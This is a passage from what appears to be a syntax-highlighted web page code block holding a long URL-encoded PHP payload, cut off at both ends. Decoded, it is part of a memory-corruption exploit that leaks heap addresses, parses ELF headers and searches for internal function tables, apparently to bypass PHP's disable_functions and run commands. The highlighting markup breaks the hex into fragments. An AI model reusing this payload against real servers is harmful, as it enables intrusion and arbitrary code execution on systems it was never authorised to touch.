class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">73</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">32</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">79</span>%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">31</span>%<span class="hljs-number">20</span>%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">36</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">79</span>%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">32</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>f%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">76</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">76</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">73</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">79</span>%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">31</span>%<span class="hljs-number">20</span>%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">35</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">73</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">21</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">7</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">24</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">7</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">73</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">66</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">66</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">20</span>%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">66</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">66</span>%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">75</span>%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">75</span>%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span 